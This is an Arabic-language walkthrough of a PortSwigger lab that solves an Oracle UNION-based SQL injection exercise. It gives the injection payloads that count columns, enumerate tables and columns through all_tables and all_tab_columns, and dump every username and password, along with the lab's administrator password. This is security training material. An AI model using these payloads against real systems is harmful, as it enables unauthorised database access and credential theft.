# [SQL injection attack, listing the database contents on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)

## **`الهدف`**
قم بتنفيذ هجوم `UNION SQLi` يقوم بإسترجاع/عرض كل أسماء المستخدمين وكلمات المرور ثم قم بتسجيل الدخول بحساب `administrator`.
## **`خطوات الحل`**
سنقوم بتكرار نفس خطوات حل [هذا اللاب](./SQL-injection-UNION-attack,-determining-the-number-of-columns-returned-by-the-query.md) لتحديد عدد الأعمدة بإستخدام `NULL` وسنجد أنها عمودين
```sql
Gifts' UNION SELECT NULL,NULL FROM DUAL--
``` 

بعد ذلك سنقوم بمحاولة لتغيير كل `NULL` بأى سلسلة نصية مثل: 'A' وسنكتشف أن كلا العمودين يدعموا النصوص، بعد ذلك سنقوم بحقن الأمر التالي لرؤية مخطط المعلومات وعرض قائمة الجداول.
```sql
' UNION SELECT table_name,NULL FROM all_tables--
```

وسنكتشف وجود جدول يُسمى `USERS_IFMWYL` فسنقوم بحقن الأمر التالي لنرى الأعمدة الموجودة بداخله
```sql
' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_IFMWYL'--
```

وسنكتشف وجود جدول يُسمى `USERNAME_CQEJJO` وجدول يُسمى `PASSWORD_NCNIIW` لذلك سنقوم بحقن الأمر التالي لنحصل على الاسم وكلمة المرور لجميع المستخدمين
```sql
' UNION SELECT USERNAME_CQEJJO, PASSWORD_NCNIIW FROM USERS_IFMWYL--
```
ثم نقوم بإرسال الطلب ونقوم بالضغط على `Mouse right-click` ثم `Copy URL` ونقوم بفتحه في المتصفح وسنجد بيانات جميع المستخدمين ظاهرة فنقوم بعدها بتسجيل الدخول إلى حساب `administrator:qbnecn0137rsd6j6ms9w` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
**`نفس ترقيع لاب` [SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](./SQL-injection-vulnerability-in-WHERE-clause-allowing-retrieval-of-hidden-data.md)
